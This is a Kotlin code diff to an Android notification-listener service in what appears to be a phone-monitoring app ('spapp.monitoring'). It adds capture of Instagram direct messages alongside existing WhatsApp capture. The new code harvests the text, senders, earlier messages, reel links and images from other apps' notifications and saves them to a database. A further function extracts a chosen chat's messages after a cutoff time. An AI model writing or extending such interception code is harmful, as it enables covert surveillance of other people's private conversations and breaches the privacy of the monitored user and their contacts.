@@ -6,6 +6,7 @@ import android.service.notification.StatusBarNotification
 import android.util.Log
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WhatsAppMessageEntry
+import com.spapp.monitoring.data.local.InstagramMessageEntry
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -53,6 +54,10 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     private fun processNotification(sbn: StatusBarNotification) {
         val pkg = sbn.packageName ?: return
+        if (pkg == "com.instagram.android") {
+            processInstagramNotification(sbn)
+            return
+        }
         if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
 
         val notification = sbn.notification ?: return
@@ -313,6 +318,301 @@ class WhatsAppNotificationListener : NotificationListenerService() {
             }
         }
 
+        return results
+    }
+
+    private fun processInstagramNotification(sbn: StatusBarNotification) {
+        val notification = sbn.notification ?: return
+        val extras = notification.extras ?: return
+
+        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
+        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
+        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
+        val text = if (!bigText.isNullOrBlank()) bigText else normalText
+        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
+        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+        val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()
+
+        var mediaType: String? = null
+        var mediaPath: String? = null
+
+        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
+            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
+            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
+
+        if (pictureBitmap != null) {
+            try {
+                val stream = java.io.ByteArrayOutputStream()
+                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
+                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+                mediaPath = "data:image/jpeg;base64,$base64"
+                mediaType = "image"
+            } catch (_: Exception) {}
+        }
+
+        val chatName = when {
+            !convoTitle.isNullOrBlank() -> convoTitle
+            !title.isNullOrBlank() && !title.equals("Instagram", ignoreCase = true) -> title
+            else -> title ?: "Instagram User"
+        }
+
+        fun extractReelUrl(txt: String?): String? {
+            if (txt.isNullOrBlank()) return null
+            val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
+            return match?.value
+        }
+
+        val entries = mutableListOf<InstagramMessageEntry>()
+
+        val messageBundles = extras.getParcelableArray("android.messages")
+        val historicBundles = extras.getParcelableArray("android.historicMessages")
+        val allBundles = mutableListOf<android.os.Bundle>()
+        if (historicBundles != null) {
+            for (item in historicBundles) {
+                if (item is android.os.Bundle) allBundles.add(item)
+            }
+        }
+        if (messageBundles != null) {
+            for (item in messageBundles) {
+                if (item is android.os.Bundle) allBundles.add(item)
+            }
+        }
+
+        if (allBundles.isNotEmpty()) {
+            for (b in allBundles) {
+                val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
+                if (bText.isBlank()) continue
+                val bTime = b.getLong("time", postTime)
+                val rawSender = b.getCharSequence("sender")?.toString()?.trim()
+                val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You sent ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
+                val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
+                val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())
+
+                val cleanText = when {
+                    bText.startsWith("You: ", ignoreCase = true) -> bText.substring(5).trim()
+                    bText.startsWith("You sent ", ignoreCase = true) -> bText.substring(9).trim()
+                    else -> bText
+                }
+
+                val foundReel = extractReelUrl(cleanText)
+                val itemMediaType = when {
+                    foundReel != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
+                    mediaType != null -> mediaType
+                    cleanText.contains("photo", ignoreCase = true) -> "image"
+                    cleanText.contains("video", ignoreCase = true) -> "video"
+                    else -> null
+                }
+
+                entries += InstagramMessageEntry(
+                    chatName = chatName,
+                    sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
+                    messageText = cleanText,
+                    isOutgoing = isOutgoing,
+                    messageTimeEpochMs = if (bTime > 0) bTime else postTime,
+                    mediaType = itemMediaType,
+                    mediaPath = mediaPath,
+                    reelUrl = foundReel
+                )
+            }
+        } else if (!textLines.isNullOrEmpty()) {
+            for (line in textLines) {
+                val lStr = line?.toString()?.trim() ?: continue
+                if (lStr.isBlank()) continue
+                val isOutgoing = lStr.startsWith("You: ", ignoreCase = true) || lStr.startsWith("You sent ", ignoreCase = true)
+                val clean = when {
+                    lStr.startsWith("You: ", ignoreCase = true) -> lStr.substring(5).trim()
+                    lStr.startsWith("You sent ", ignoreCase = true) -> lStr.substring(9).trim()
+                    else -> lStr
+                }
+                val foundReel = extractReelUrl(clean)
+                val itemMediaType = when {
+                    foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
+                    mediaType != null -> mediaType
+                    else -> null
+                }
+                entries += InstagramMessageEntry(
+                    chatName = chatName,
+                    sender = if (isOutgoing) "me" else (title ?: chatName),
+                    messageText = clean,
+                    isOutgoing = isOutgoing,
+                    messageTimeEpochMs = postTime,
+                    mediaType = itemMediaType,
+                    mediaPath = mediaPath,
+                    reelUrl = foundReel
+                )
+            }
+        } else if (!text.isNullOrBlank()) {
+            val hasYouPrefix = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You sent ", ignoreCase = true)
+            val clean = when {
+                text.startsWith("You: ", ignoreCase = true) -> text.substring(5).trim()
+                text.startsWith("You sent ", ignoreCase = true) -> text.substring(9).trim()
+                else -> text
+            }
+            val foundReel = extractReelUrl(clean)
+            val itemMediaType = when {
+                foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
+                mediaType != null -> mediaType
+                clean.contains("photo", ignoreCase = true) -> "image"
+                clean.contains("video", ignoreCase = true) -> "video"
+                else -> null
+            }
+            entries += InstagramMessageEntry(
+                chatName = chatName,
+                sender = if (hasYouPrefix) "me" else (title ?: chatName),
+                messageText = clean,
+                isOutgoing = hasYouPrefix,
+                messageTimeEpochMs = postTime,
+                mediaType = itemMediaType,
+                mediaPath = mediaPath,
+                reelUrl = foundReel
+            )
+        }
+
+        if (entries.isNotEmpty()) {
+            scope.launch {
+                try {
+                    val db = AppDatabase.getInstance(applicationContext)
+                    db.instagramMessageDao().insertAll(entries)
+                    Log.d(TAG, "Saved ${entries.size} Instagram messages for $chatName")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to save Instagram messages", e)
+                }
+            }
+        }
+    }
+
+    fun extractMessagesForInstagramChat(
+        targetChatName: String,
+        cutoffTimeMs: Long
+    ): List<InstagramMessageEntry> {
+        val cleanChatName = targetChatName.trim()
+        val results = mutableListOf<InstagramMessageEntry>()
+        val activeNotifs = activeNotifications ?: return emptyList()
+
+        fun extractReelUrl(txt: String?): String? {
+            if (txt.isNullOrBlank()) return null
+            val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
+            return match?.value
+        }
+
+        for (sbn in activeNotifs) {
+            val pkg = sbn.packageName ?: continue
+            if (pkg != "com.instagram.android") continue
+
+            val notification = sbn.notification ?: continue
+            val extras = notification.extras ?: continue
+
+            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
+            val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
+            val notifChat = convoTitle ?: title ?: ""
+
+            val isMatch = notifChat.equals(cleanChatName, ignoreCase = true) ||
+                    (cleanChatName.length >= 3 && notifChat.contains(cleanChatName, ignoreCase = true)) ||
+                    (notifChat.length >= 3 && cleanChatName.contains(notifChat, ignoreCase = true))
+
+            if (!isMatch) continue
+
+            val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()
+
+            var mediaType: String? = null
+            var mediaPath: String? = null
+            val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
+                ?: (extras.get("android.picture") as? android.graphics.Bitmap)
+                ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
+
+            if (pictureBitmap != null) {
+                try {
+                    val stream = java.io.ByteArrayOutputStream()
+                    pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
+                    val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+                    mediaPath = "data:image/jpeg;base64,$base64"
+                    mediaType = "image"
+                } catch (_: Exception) {}
+            }
+
+            val messageBundles = extras.getParcelableArray("android.messages")
+            val historicBundles = extras.getParcelableArray("android.historicMessages")
+            val allBundles = mutableListOf<android.os.Bundle>()
+            if (historicBundles != null) {
+                for (item in historicBundles) {
+                    if (item is android.os.Bundle) allBundles.add(item)
+                }
+            }
+            if (messageBundles != null) {
+                for (item in messageBundles) {
+                    if (item is android.os.Bundle) allBundles.add(item)
+                }
+            }
+
+            if (allBundles.isNotEmpty()) {
+                for (b in allBundles) {
+                    val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
+                    if (bText.isBlank()) continue
+                    val bTime = b.getLong("time", postTime)
+                    if (bTime < cutoffTimeMs) continue
+
+                    val rawSender = b.getCharSequence("sender")?.toString()?.trim()
+                    val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You sent ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
+                    val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
+                    val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())
+
+                    val cleanText = when {
+                        bText.startsWith("You: ", ignoreCase = true) -> bText.substring(5).trim()
+                        bText.startsWith("You sent ", ignoreCase = true) -> bText.substring(9).trim()
+                        else -> bText
+                    }
+
+                    val foundReel = extractReelUrl(cleanText)
+                    val itemMediaType = when {
+                        foundReel != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
+                        mediaType != null -> mediaType
+                        cleanText.contains("photo", ignoreCase = true) -> "image"
+                        cleanText.contains("video", ignoreCase = true) -> "video"
+                        else -> null
+                    }
+
+                    results += InstagramMessageEntry(
+                        chatName = cleanChatName,
+                        sender = if (isOutgoing) "me" else (rawSender ?: title ?: cleanChatName),
+                        messageText = cleanText,
+                        isOutgoing = isOutgoing,
+                        messageTimeEpochMs = bTime,
+                        mediaType = itemMediaType,
+                        mediaPath = mediaPath,
+                        reelUrl = foundReel
+                    )
+                }
+            } else {
+                val singleText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
+                    ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
+                if (!singleText.isNullOrBlank() && postTime >= cutoffTimeMs) {
+                    val isSingleOutgoing = singleText.startsWith("You: ", ignoreCase = true) || singleText.startsWith("You sent ", ignoreCase = true) || singleText.startsWith("You reacted ", ignoreCase = true)
+                    val cleanSingle = when {
+                        singleText.startsWith("You: ", ignoreCase = true) -> singleText.substring(5).trim()
+                        singleText.startsWith("You sent ", ignoreCase = true) -> singleText.substring(9).trim()
+                        else -> singleText
+                    }
+                    val foundReel = extractReelUrl(cleanSingle)
+                    val itemMediaType = when {
+                        foundReel != null || cleanSingle.contains("reel", ignoreCase = true) -> "reel"
+                        mediaType != null -> mediaType
+                        cleanSingle.contains("photo", ignoreCase = true) -> "image"
+                        cleanSingle.contains("video", ignoreCase = true) -> "video"
+                        else -> null
+                    }
+                    results += InstagramMessageEntry(
+                        chatName = cleanChatName,
+                        sender = if (isSingleOutgoing) "me" else (title ?: cleanChatName),
+                        messageText = cleanSingle,
+                        isOutgoing = isSingleOutgoing,
+                        messageTimeEpochMs = postTime,
+                        mediaType = itemMediaType,
+                        mediaPath = mediaPath,
+                        reelUrl = foundReel
+                    )
+                }
+            }
+        }
         return results
     }
 
